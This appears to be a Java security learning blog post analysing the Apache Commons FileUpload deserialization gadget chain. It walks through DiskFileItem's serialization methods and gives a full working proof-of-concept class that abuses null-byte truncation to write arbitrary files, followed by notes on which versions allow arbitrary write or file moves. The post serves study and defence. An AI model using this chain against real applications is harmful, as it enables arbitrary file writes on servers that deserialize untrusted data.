# Java Security Learning—FileUpload Chain

Author: H3rmesk1t

Data: 2022.03.15

# FileUpload Introduction
The [Commons FileUpload](https://commons.apache.org/proper/commons-fileupload/index.html) package makes it easy to add robust, high-performance, file upload capability to your servlets and web applications.


# Environment configuration

```xml
<dependencies>
    <dependency>
        <groupId>commons-fileupload</groupId>
        <artifactId>commons-fileupload</artifactId>
        <version>1.3</version>
    </dependency>
    <dependency>
        <groupId>commons-io</groupId>
        <artifactId>commons-io</artifactId>
        <version>2.4</version>
    </dependency>
</dependencies>
```

# Pre-knowledge
## DiskFileItem
`org.apache.commons.fileupload.FileItem` represents the file or form item received in the `multipart/form-data POST` request. `org.apache.commons.fileupload.disk.DiskFileItem` is the implementation class of `FileItem`, which is used to encapsulate all items in a request message entity and is encapsulated when `FileUploadBase#parseRequest` is parsed. The action is completed by the `createItem` method of `DiskFileItemFactory`.

When the uploaded file items are small, they will be saved directly in memory (faster speed); when the uploaded file items are large, they will be saved in the temporary folder of the disk in the form of temporary files. In this process, several properties in the `DiskFileItem` class are used:
 - repository: A member variable of type File, where the file is saved to the storage location on the hard disk.
 - sizeThreshold: File size threshold, if this value is exceeded, the uploaded file will be stored on the hard disk.
 - fileName: Original file name.
 - dfos: A `DeferredFileOutputStream` object for writing out `OutputStream`.
 - dfosFile: A `File` object that allows operations to be serialized.
  
`DiskFileItem` rewrites the `readObject` method to implement its own logic, used to migrate an HTTP session containing `DiskFileItem` between `JVM`. It is also particularly emphasized in the class comment that the file storage location `repository` may be different in different machines and requires verification. That is to say, if a `DiskFileItem` class with data is deserialized, the file write-out operation may be triggered.

### writeObject
Follow up on `DiskFileItem#writeObject` first and see the logic of its implementation.

```java
private void writeObject(ObjectOutputStream out) throws IOException {
    if (this.dfos.isInMemory()) {
        this.cachedContent = this.get();
    } else {
        this.cachedContent = null;
        this.dfosFile = this.dfos.getFile();
    }

    out.defaultWriteObject();
}
```

Call the `dfos.isInMemory` method to determine whether the file content is recorded in memory. After following up, it is found that it is judged by comparing the length of `writen` and the threshold length of `threshold`. If `writen` is greater than `threshold`, the file content will be written out to the file.

```java
public boolean isInMemory() {
    return !this.isThresholdExceeded();
}

public boolean isThresholdExceeded() {
    return this.writen > (long)threshold;
}
```

When the `dfos.isInMemory` method is judged as `True`, the `get` method is called, and then the `dfos.getData` method is called. The `ByteArrayOutputStream` object of the `cachedContent` of the `dfos` member variable `memoryOutputStream` is placed in `cachedContent`.

```java
public byte[] get() {
    if (this.isInMemory()) {
        if (this.cachedContent == null) {
            this.cachedContent = this.dfos.getData();
        }

        return this.cachedContent;
    } else {......}

        return fileData;
    }
}

public byte[] getData() {
    return this.memoryOutputStream != null ? this.memoryOutputStream.toByteArray() : null;
}
```

When the `dfos.isInMemory` method is judged as `False`, the `cachedContent` will be empty, and then the `dfosFile` is assigned to the `dfos` member variable `outputFile` object.

```java
public File getFile() {
    return this.outputFile;
}
```

Since `dfos` is modified with `transient` and cannot be deserialized, only `cachedContent` of the `byte` array type and `dfosFile` of the `File` object.

### readObject
Then follow up on `DiskFileItem#readObject` and see the logic of its implementation.

```java
private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
    in.defaultReadObject();
    OutputStream output = this.getOutputStream();
    if (this.cachedContent != null) {
        output.write(this.cachedContent);
    } else {
        FileInputStream input = new FileInputStream(this.dfosFile);
        IOUtils.copy(input, output);
        this.dfosFile.delete();
        this.dfosFile = null;
    }

    output.close();
    this.cachedContent = null;
}
```

Call the `getOutputStream` method to get the `OutputStream` object. After following up, I found that `new` a `DeferredFileOutputStream` object. The file path uses `tempFile`, if it is empty, `repository` is used, if it is empty, `System.getProperty("java.io.tmpdir")` is used, and the file name uses `String.format("upload_%s_%s.tmp", UID, getUniqueId())` to generate a random file name.

```java
public OutputStream getOutputStream() throws IOException {
    if (this.dfos == null) {
        File outputFile = this.getTempFile();
        this.dfos = new DeferredFileOutputStream(this.sizeThreshold, outputFile);
    }

    return this.dfos;
}

protected File getTempFile() {
    if (this.tempFile == null) {
        File tempDir
= this.repository;
        if (tempDir == null) {
            tempDir = new File(System.getProperty("java.io.tmpdir"));
        }

        String tempFileName = String.format("upload_%s_%s.tmp", UID, getUniqueId());
        this.tempFile = new File(tempDir, tempFileName);
    }

    return this.tempFile;
}
```

Then make a judgment on `cachedContent`, and if it is not empty, directly `write`. Otherwise, copy the content of the `dfosFile` file to `OutputStream` and write it out, and delete the file.

# POC
```java
package org.h3rmesk1t.FileUpload;

import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/15 9:02 pm
 */
public class FileUploadExploit {

    public static String serialize(Object obj) throws Exception {

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(obj);
        byte[] expCode = byteArrayOutputStream.toByteArray();
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(expCode);
    }

    public static void unserialize(String expBase64) throws Exception {

        byte[] bytes = Base64.getDecoder().decode(expBase64);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

    public static void main(String[] args) throws Exception {

        // Create a file write directory File object, and file write content.
        byte[] bytes = "Hello, H3rmesk1t".getBytes(StandardCharsets.UTF_8);

        // Below version 1.3, you can use \0 to cut it
        File repository = new File("/Users/h3rmesk1t/Desktop/FileUpload/hello.txt\0");

        // 1.3.1 and above versions, only directories can be specified
        // File File repository = new File("/Users/h3rmesk1t/Desktop/FileUpload");

        // Create a dfos object.
        DeferredFileOutputStream deferredFileOutputStream = new DeferredFileOutputStream(0, repository);

        // Use repository to initialize the deserialized DiskFileItem object.
        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);

        // WriteObject requires that dfos cannot be null during serialization.
        Field dfosFile = DiskFileItem.class.getDeclaredField("dfos");
        dfosFile.setAccessible(true);
        dfosFile.set(diskFileItem, deferredFileOutputStream);

        // Reflection writes cachedContent to.
        Field cachedContentField = DiskFileItem.class.getDeclaredField("cachedContent");
        cachedContentField.setAccessible(true);
        cachedContentField.set(diskFileItem, bytes);

        // Serialization operation.
        String exp = serialize(diskFileItem);
        System.out.println(exp);

        // Deserialization operation.
        unserialize(exp);
    }
}
```

It should be noted that in the `1.3.1` version, the official fixes the null byte truncation. In `readObject`, it is judged whether the member variable `repository` is empty, and whether it is a directory without being empty, and whether the directory path contains the `\0` empty character. In this case, writing of any file cannot be realized. You can only specify the content written to the directory and the file name can only be generated according to the code rules. When `cachedContent` is empty, the content in `dfosFile` will be copied and the `delete` method is called to delete. This code can be used to complete the movement of any file.

<div align=center><img src="./images/1.png"></div>

# Call chain
```java
DiskFileItem.readObject()
    DiskFileItem.getOutputStream()
            DeferredFileOutputStream.write()
```

# Summarize
## Usage Instructions
Using the deserialization of `DiskFileItem` will attack the feature of the written file. With the help of `JDK`' null byte truncation, the vulnerability call chain of arbitrary file writing and any file movement can be completed.

## Gadget
 - kick-off gadget: org.apache.commons.fileupload.disk.DiskFileItem#readObject
 - sink gadget: org.apache.commons.fileupload.disk.DiskFileItem#getOutputStream
 - chain gadget: org.apache.commons.beanutils.BeanComparator#compare

## Vulnerability Exploit Methods
 - The version before `FileUpload`, combined with the version before `JDK1.7`, can achieve the vulnerability of writing to any file.
 - The versions before `FileUpload`, combined with `JDK1.7` and later versions, can write files to any directory.
 - `1.3.1` of `FileUpload` and subsequent versions can only write files to specific directories and this directory must also exist, and the naming of the file cannot be controlled.

# refer to
 - [FileUpload1](https://su18.org/post/ysoserial-su18-4/#:~:text=%E5%8E%9F%E7%90%86%20%23%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-,FileUpload1,-FileUpload%20%E7%BB%84%E4%BB
%B6)